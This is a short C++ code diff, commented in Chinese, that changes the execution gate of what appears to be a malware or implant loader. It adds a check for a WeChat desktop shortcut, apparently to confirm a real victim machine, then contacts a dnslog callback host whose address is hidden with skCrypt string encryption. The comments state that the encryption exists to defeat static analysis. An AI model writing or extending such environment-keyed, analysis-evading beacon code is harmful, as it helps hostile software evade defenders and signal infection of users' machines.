@@ -176,9 +176,21 @@ bool check_edge() {
         return FALSE;
     }
 }
+//判断微信的快捷方式是否存在，微信安装时会自动在C:\Users\Public\Desktop下创建快捷方式，无需获取系统用户名，此方法不敏感
+bool check_wechat() {
+    std::string filePath = "C:\\Users\\Public\\Desktop\\微信.lnk";
+    // 检查文件是否存在
+    if (GetFileAttributesA(filePath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+        // 文件不存在
+        return FALSE;
+    }
+    else {
+        return TRUE;
+    }
+}
 int main() {
     //用于提示已经成功执行
-    if (check_edge()) {
+    if (check_wechat()) {
         //dnslog地址 可自行更换或者不使用
         //使用了skCrypt库加密字符串 防止静态分析发现dnslog地址
         auto url = skCrypt("ul6u2p5x.requestrepo.com");
